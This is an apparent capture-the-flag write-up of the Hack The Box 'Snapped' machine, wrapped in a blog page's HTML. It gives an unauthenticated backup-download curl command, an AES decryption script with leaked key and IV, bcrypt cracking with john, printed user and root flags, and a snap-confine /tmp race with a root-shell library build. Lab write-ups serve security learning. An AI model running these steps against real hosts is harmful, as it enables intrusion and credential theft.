@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+>
+
+<title>HTB SNAPPED WRITEUP | SYC</title>
+
+<meta
+    name="description"
+    content="check the website fuzz the subdomain,we found admin check the admin we found this cve-2026–27944 so use curl -v -X GET “$TARGET/api/backup” \ -H “User-Agent: Mozilla/5.0”..."
+>
+
+<meta
+    name="robots"
+    content="index, follow"
+>
+
+<link
+    rel="canonical"
+    href="https://syc-sigma.vercel.app/p/HTB%20snapped%20Writeup"
+>
+
+<meta
+    property="og:title"
+    content="HTB SNAPPED WRITEUP | SYC"
+>
+
+<meta
+    property="og:description"
+    content="check the website fuzz the subdomain,we found admin check the admin we found this cve-2026–27944 so use curl -v -X GET “$TARGET/api/backup” \ -H “User-Agent: Mozilla/5.0”..."
+>
+
+<meta
+    property="og:type"
+    content="article"
+>
+
+<meta
+    property="og:url"
+    content="https://syc-sigma.vercel.app/p/HTB%20snapped%20Writeup"
+>
+
+<meta
+    property="og:site_name"
+    content="SYC"
+>
+
+<meta
+    name="twitter:card"
+    content="summary"
+>
+
+<meta
+    name="twitter:title"
+    content="HTB SNAPPED WRITEUP | SYC"
+>
+
+<meta
+    name="twitter:description"
+    content="check the website fuzz the subdomain,we found admin check the admin we found this cve-2026–27944 so use curl -v -X GET “$TARGET/api/backup” \ -H “User-Agent: Mozilla/5.0”..."
+>
+
+<link rel="icon" type="image/png" href="/favicon.png">
+
+<link
+    rel="shortcut icon"
+    href="/favicon.ico"
+    type="image/x-icon"
+>
+
+<link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=Fira+Code&display=swap"
+    rel="stylesheet"
+>
+
+<link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+    id="hljs-style"
+>
+
+<script
+    src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"
+    defer
+></script>
+
+
+<style>
+
+:root[data-theme="dark"] {
+    --bg-1: #050505;
+    --bg-2: #0a0c1a;
+    --bg-3: #120d1a;
+    --text-main: #ffffff;
+    --text-dim: rgba(255, 255, 255, 0.5);
+    --accent: #ffffff;
+    --canvas-opacity: 0.9;
+    --code-bg: rgba(0, 0, 0, 0.5);
+}
+
+:root[data-theme="light"] {
+    --bg-1: #fdfdfd;
+    --bg-2: #f0f4ff;
+    --bg-3: #f9f0ff;
+    --text-main: #000000;
+    --text-dim: rgba(0, 0, 0, 0.5);
+    --accent: #000000;
+    --canvas-opacity: 0.5;
+    --code-bg: rgba(0, 0, 0, 0.05);
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    transition:
+        background-color 0.6s,
+        color 0.4s;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    background:
+        linear-gradient(
+            125deg,
+            var(--bg-1),
+            var(--bg-2),
+            var(--bg-3),
+            var(--bg-1)
+        );
+
+    background-size: 400% 400%;
+
+    animation:
+        spaceFlow 25s ease infinite;
+
+    color: var(--text-main);
+
+    font-family:
+        'Inter',
+        -apple-system,
+        BlinkMacSystemFont,
+        sans-serif;
+
+    line-height: 1.8;
+
+    overflow-x: hidden;
+}
+
+@keyframes spaceFlow {
+    0% {
+        background-position: 0% 50%;
+    }
+
+    50% {
+        background-position: 100% 50%;
+    }
+
+    100% {
+        background-position: 0% 50%;
+    }
+}
+
+#article-canvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+
+    width: 100%;
+    height: 100%;
+
+    z-index: -1;
+
+    pointer-events: none;
+
+    opacity: var(--canvas-opacity);
+}
+
+.theme-toggle {
+    position: fixed;
+
+    bottom: 30px;
+    right: 30px;
+
+    width: 48px;
+    height: 48px;
+
+    border-radius: 50%;
+
+    background: var(--text-main);
+    color: var(--bg-1);
+
+    border: none;
+
+    cursor: pointer;
+
+    z-index: 2000;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    font-family: 'Fira Code';
+
+    font-size: 10px;
+
+    font-weight: bold;
+
+    box-shadow:
+        0 10px 30px rgba(0,0,0,0.2);
+}
+
+#progress {
+    position: fixed;
+
+    top: 0;
+    left: 0;
+
+    height: 3px;
+
+    background: var(--accent);
+
+    width: 0%;
+
+    z-index: 2000;
+}
+
+nav {
+    padding: 25px 40px;
+
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+
+    position: sticky;
+
+    top: 0;
+
+    z-index: 1000;
+
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+}
+
+nav a {
+    color: var(--text-dim);
+
+    text-decoration: none;
+
+    font-size: 11px;
+
+    font-family: 'Fira Code';
+
+    letter-spacing: 1px;
+}
+
+nav a:hover {
+    color: var(--text-main);
+}
+
+.content-wrapper {
+    max-width: 900px;
+
+    margin: 40px auto;
+
+    padding: 40px 24px;
+
+    min-height: 80vh;
+}
+
+.article-header {
+    margin-bottom: 70px;
+}
+
+.article-header h1 {
+    font-size:
+        clamp(32px, 7vw, 64px);
+
+    font-weight: 700;
+
+    color: var(--text-main);
+
+    letter-spacing: -4px;
+
+    line-height: 1;
+
+    text-transform: uppercase;
+}
+
+.article-meta {
+    margin-top: 20px;
+
+    color: var(--text-dim);
+
+    font-family: 'Fira Code';
+
+    font-size: 11px;
+
+    letter-spacing: 1px;
+}
+
+.markdown-body {
+    overflow-wrap: break-word;
+}
+
+.markdown-body img {
+    max-width: 100%;
+
+    height: auto;
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    display: block;
+
+    box-shadow:
+        0 20px 50px rgba(0,0,0,0.1);
+}
+
+.markdown-body h1 {
+    font-size: 38px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+}
+
+.markdown-body h2 {
+    font-size: 28px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+
+    border-bottom:
+        1px solid var(--text-dim);
+
+    padding-bottom: 8px;
+}
+
+.markdown-body h3 {
+    font-size: 22px;
+
+    margin: 40px 0 15px;
+
+    color: var(--text-main);
+}
+
+.markdown-body p {
+    margin-bottom: 25px;
+
+    font-size: 17px;
+
+    opacity: 0.85;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+    margin: 20px 0 25px;
+
+    padding-left: 30px;
+}
+
+.markdown-body li {
+    margin-bottom: 8px;
+}
+
+.markdown-body a {
+    color: var(--text-main);
+
+    text-decoration:
+        underline;
+
+    text-underline-offset: 4px;
+}
+
+.markdown-body blockquote {
+    margin: 25px 0;
+
+    padding: 15px 20px;
+
+    border-left:
+        3px solid var(--text-main);
+
+    color: var(--text-dim);
+}
+
+.markdown-body pre {
+    background:
+        var(--code-bg) !important;
+
+    padding: 25px;
+
+    border:
+        1px solid var(--text-dim);
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+
+    backdrop-filter: blur(10px);
+}
+
+.markdown-body code {
+    font-family: 'Fira Code';
+
+    font-size: 14px;
+
+    background:
+        rgba(128,128,128,0.1);
+
+    padding: 3px 6px;
+
+    border-radius: 4px;
+}
+
+.markdown-body pre code {
+    background: transparent;
+
+    padding: 0;
+}
+
+.markdown-body table {
+    width: 100%;
+
+    border-collapse: collapse;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+}
+
+.markdown-body th,
+.markdown-body td {
+    border:
+        1px solid var(--text-dim);
+
+    padding: 10px;
+
+    text-align: left;
+}
+
+.markdown-body th {
+    color: var(--text-main);
+}
+
+@media (max-width: 768px) {
+
+    .content-wrapper {
+        padding: 20px;
+    }
+
+    nav {
+        padding: 15px 20px;
+    }
+
+    .article-header h1 {
+        letter-spacing: -2px;
+    }
+
+    .markdown-body p {
+        font-size: 16px;
+    }
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+<div id="progress"></div>
+
+<canvas id="article-canvas"></canvas>
+
+
+<button
+    class="theme-toggle"
+    onclick="toggleTheme()"
+>
+    MODE
+</button>
+
+
+<nav>
+
+<a href="/">
+    &lt;- BACK_TO_TERMINAL
+</a>
+
+<span
+    id="reading-id"
+    style="
+        font-family:'Fira Code';
+        font-size:10px;
+        color:var(--text-dim);
+    "
+>
+    SYSTEM: SYNCED
+</span>
+
+</nav>
+
+
+<main class="content-wrapper">
+
+<header class="article-header">
+
+<h1>
+HTB SNAPPED WRITEUP
+</h1>
+
+<div class="article-meta">
+    HTB SNAPPED WRITEUP.MD
+</div>
+
+</header>
+
+
+<article class="markdown-body">
+
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*qY4xA4nM3L3poHkI7QieuA.png" /></p>
+<p>check the website</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*EHAndmTgg9CpuJHo2gBwXg.png" /></p>
+<p>fuzz the subdomain,we found admin</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*w6CaAtqJ5lml4dDwNe4MYw.png" /></p>
+<p>check the admin</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*xdXO_S2GXJDAQxPoztsowQ.png" /></p>
+<p>we found this</p>
+<p>cve-2026–27944</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*QO3AsNVO92mRAl7aQRRBMQ.png" /></p>
+<p>so use</p>
+<p><strong><em><br />
+curl -v -X GET “$TARGET/api/backup” \<br />
+ -H “User-Agent: Mozilla/5.0” \<br />
+ — output backup_encrypted.tar.gz \<br />
+ — dump-header response_headers.txt 2&gt;&amp;1 | tee full_response.log</em></strong></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1500/1*ntqaK8bn_nkuPywefrf8pQ.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*PiyPvtAiJvNHQ2dQ_3R1zQ.png" /></p>
+<p>it works</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*YKARd5lcxAWFXP977VXbFQ.png" /></p>
+<p>ok， with the help of ai</p>
+<p>we got this</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*ALjp2Fsdk4u-0XTQ0uIg6A.png" /></p>
+<p>than use</p>
+<blockquote>
+<p><strong><em>import base64<br />
+from Crypto.Cipher import AES<br />
+from Crypto.Util.Padding import unpad</em></strong></p>
+<p><strong><em># 漏洞响应头里拿到的 Key 和 IV<br />
+b64_key = “5gG82yiLZgiGhnJgx5xV86oZjceUth9GK35AamkNmRA=”<br />
+b64_iv = “egj9kpMwank1H0+6wJXv4g==”</em></strong></p>
+<p><strong><em>key = base64.b64decode(b64_key)<br />
+iv = base64.b64decode(b64_iv)</em></strong></p>
+<p>*<em>_def decrypt_file(filename, output_name):<br />
+ print(f”[</em>] 正在解密: {filename} …”)<br />
+ with open(filename, “rb”) as f:<br />
+ data = f.read()  </p>
+<p>try:<br />
+ cipher = AES.new(key, AES.MODE_CBC, iv=iv)<br />
+ # 解密并去除 PKCS7 填充<br />
+ decrypted = unpad(cipher.decrypt(data), AES.block_size)  </p>
+<p>with open(output_name, “wb”) as f:<br />
+ f.write(decrypted)<br />
+ print(f”[+] 成功解密! 已保存为: {output_name}”)<br />
+ except Exception as e:<br />
+ print(f”[-] {filename} 解密失败: {e}”)_**</p>
+<p><strong><em># 执行解密<br />
+decrypt_file(“nginx-ui.zip”, “nginx-ui-fixed.zip”)<br />
+decrypt_file(“nginx.zip”, “nginx-fixed.zip”)</em></strong></p>
+</blockquote>
+<p>we got </p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*mlaWodaS4uJRbU1pUgzHqA.png" /></p>
+<p>than,we got</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*hgIXdbPjho5ZdUg0WdgIcA.png" /></p>
+<p>so,check the database at first.</p>
+<p>sqlite3 database.db</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*ZV9bUDQKCTGSuX2nU4d7sA.png" /></p>
+<p>we found users</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*I7ztWZbdB_I9IJATrPZbsw.png" /></p>
+<p>we got the hashes</p>
+<p>so,use</p>
+<p><strong><em>john — format=bcrypt — wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</em></strong></p>
+<p>and we got this</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*tG51gh_RP-p9n97Wnh2_hA.png" /></p>
+<p>its jonathan`s password</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*BhFGMw0MyzW5lQTZXoAEgQ.png" /></p>
+<p>and we got a user flag</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*4OsNKJTEOOTD0h9-yZl3hg.png" /></p>
+<p><strong><em>9aa4d5d86b9a14ed1c9b15015db0a917</em></strong></p>
+<p>than </p>
+<p>Privilege Escalation</p>
+<p>but you know what</p>
+<p>we got copy fail</p>
+<p>siu — </p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*-oCLrOXFY4mKqA6T-rL4iA.png" /></p>
+<p><strong><em>02aa0a2ea3cef2fa82bfa08949ccb899</em></strong></p>
+<p>here is the right way </p>
+<p>first,</p>
+<p>we got snaapped</p>
+<p>so, we found # CVE-2026-3888</p>
+<p>but still not so sure</p>
+<p>so,</p>
+<p>it means allow any unprivileged regular user to create isolated user namespaces.
+ you will be a root when you execute something at a sandbox</p>
+<p>Systemd-tmpfiles periodically cleans up expired files under /tmp.</p>
+<p>After it deletes the /tmp/.snap directory used by Snap applications, an attacker can race to create a directory with the same name as an unprivileged user and plant malicious files inside it (such as a .so file you compile).</p>
+<p>When the Snap application starts again, the snap-confine program, which runs with root privileges, mistakenly trusts and uses this directory that has already been tampered with by the attacker, causing the malicious code to execute with root privileges.</p>
+<p>so add a new user and ssh </p>
+<p>use </p>
+<p>gcc -nostdlib -static -Wl,--entry=start -o librootshell.so librootshell.c</p>
+<p>than,wget it and run， we got it.</p>
+<p>remember change the code it works.</p>
+<p>tips:beacuse of my fault, the pictures disappeared.😥😥😥</p>
+
+</article>
+
+</main>
+
+
+<script>
+
+/* ==========================================================
+   Theme
+   ========================================================== */
+
+function toggleTheme() {
+
+    const root =
+        document.documentElement;
+
+    const target =
+        root.getAttribute('data-theme') === 'dark'
+            ? 'light'
+            : 'dark';
+
+    root.setAttribute(
+        'data-theme',
+        target
+    );
+
+    localStorage.setItem(
+        'theme',
+        target
+    );
+
+    const style =
+        document.getElementById(
+            'hljs-style'
+        );
+
+    if (style) {
+
+        style.href =
+            target === 'dark'
+                ? "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+                : "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github.min.css";
+    }
+}
+
+
+/* ==========================================================
+   Restore Theme
+   ========================================================== */
+
+try {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            localStorage.getItem('theme') || 'dark'
+        );
+
+} catch (e) {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            'dark'
+        );
+}
+
+
+/* ==========================================================
+   Code Highlight
+   ========================================================== */
+
+window.addEventListener(
+    'load',
+    () => {
+
+        if (
+            window.hljs
+        ) {
+
+            document
+                .querySelectorAll(
+                    'pre code'
+                )
+                .forEach(
+                    (el) => {
+                        hljs.highlightElement(el);
+                    }
+                );
+        }
+
+    }
+);
+
+
+/* ==========================================================
+   Reading ID
+   ========================================================== */
+
+document
+    .getElementById('reading-id')
+    .innerText =
+        'SYSTEM: HTB SNAPPED WRITEUP.MD';
+
+
+/* ==========================================================
+   Reading Progress
+   ========================================================== */
+
+window.addEventListener(
+    'scroll',
+    () => {
+
+        const winScroll =
+            document.documentElement.scrollTop;
+
+        const height =
+            document.documentElement.scrollHeight -
+            document.documentElement.clientHeight;
+
+        const percentage =
+            height > 0
+                ? (winScroll / height) * 100
+                : 0;
+
+        document
+            .getElementById('progress')
+            .style.width =
+                percentage + '%';
+
+    }
+);
+
+
+/* ==========================================================
+   Dynamic Background
+   ========================================================== */
+
+const canvas =
+    document.getElementById(
+        'article-canvas'
+    );
+
+const ctx =
+    canvas.getContext('2d');
+
+let fluidNodes = [];
+
+let trailParticles = [];
+
+const mouse = {
+    x: -500,
+    y: -500
+};
+
+
+function initCanvas() {
+
+    canvas.width =
+        window.innerWidth;
+
+    canvas.height =
+        window.innerHeight;
+
+    fluidNodes =
+        Array.from(
+            { length: 3 },
+            () => ({
+
+                x:
+                    Math.random() *
+                    canvas.width,
+
+                y:
+                    Math.random() *
+                    canvas.height,
+
+                vx:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                vy:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                size:
+                    Math.random() *
+                    (canvas.width * 0.4) +
+                    canvas.width * 0.3
+            })
+        );
+}
+
+
+window.onmousemove =
+    (e) => {
+
+        mouse.x =
+            e.clientX;
+
+        mouse.y =
+            e.clientY;
+
+        for (
+            let i = 0;
+            i < 2;
+            i++
+        ) {
+
+            trailParticles.push(
+                new Particle(
+                    mouse.x,
+                    mouse.y
+                )
+            );
+        }
+    };
+
+
+class Particle {
+
+    constructor(x, y) {
+
+        this.x = x;
+
+        this.y = y;
+
+        this.vx =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.vy =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.life = 1.0;
+
+        this.decay =
+            0.015 +
+            Math.random() * 0.02;
+
+        this.size =
+            Math.random() * 2.5 +
+            0.5;
+    }
+
+    update() {
+
+        this.x += this.vx;
+
+        this.y += this.vy;
+
+        this.life -= this.decay;
+    }
+
+    draw(color) {
+
+        ctx.fillStyle =
+            `rgba(${color}, ${this.life * 0.4})`;
+
+        ctx.beginPath();
+
+        ctx.arc(
+            this.x,
+            this.y,
+            this.size,
+            0,
+            Math.PI * 2
+        );
+
+        ctx.fill();
+    }
+}
+
+
+function draw() {
+
+    const isDark =
+        document.documentElement
+            .getAttribute(
+                'data-theme'
+            ) === 'dark';
+
+    ctx.fillStyle =
+        isDark
+            ? "rgba(5, 5, 5, 0.15)"
+            : "rgba(253, 253, 253, 0.15)";
+
+    ctx.fillRect(
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
+
+    ctx.globalCompositeOperation =
+        isDark
+            ? "lighter"
+            : "multiply";
+
+
+    const colorRGB =
+        isDark
+            ? "60, 70, 100"
+            : "200, 210, 240";
+
+
+    fluidNodes.forEach(
+        node => {
+
+            node.x += node.vx;
+
+            node.y += node.vy;
+
+
+            if (
+                node.x < 0 ||
+                node.x > canvas.width
+            ) {
+                node.vx *= -1;
+            }
+
+
+            if (
+                node.y < 0 ||
+                node.y > canvas.height
+            ) {
+                node.vy *= -1;
+            }
+
+
+            const g =
+                ctx.createRadialGradient(
+                    node.x,
+                    node.y,
+                    0,
+                    node.x,
+                    node.y,
+                    node.size
+                );
+
+
+            g.addColorStop(
+                0,
+                `rgba(${colorRGB}, 0.3)`
+            );
+
+            g.addColorStop(
+                1,
+                "transparent"
+            );
+
+
+            ctx.fillStyle = g;
+
+            ctx.beginPath();
+
+            ctx.arc(
+                node.x,
+                node.y,
+                node.size,
+                0,
+                Math.PI * 2
+            );
+
+            ctx.fill();
+
+        }
+    );
+
+
+    ctx.globalCompositeOperation =
+        "source-over";
+
+
+    const particleRGB =
+        isDark
+            ? "255, 255, 255"
+            : "0, 0, 0";
+
+
+    trailParticles.forEach(
+        (p, i) => {
+
+            p.update();
+
+            p.draw(
+                particleRGB
+            );
+
+            if (
+                p.life <= 0
+            ) {
+                trailParticles.splice(
+                    i,
+                    1
+                );
+            }
+        }
+    );
+
+
+    requestAnimationFrame(
+        draw
+    );
+}
+
+
+window.addEventListener(
+    'resize',
+    initCanvas
+);
+
+initCanvas();
+
+draw();
+
+</script>
+
+</body>
+
+</html>
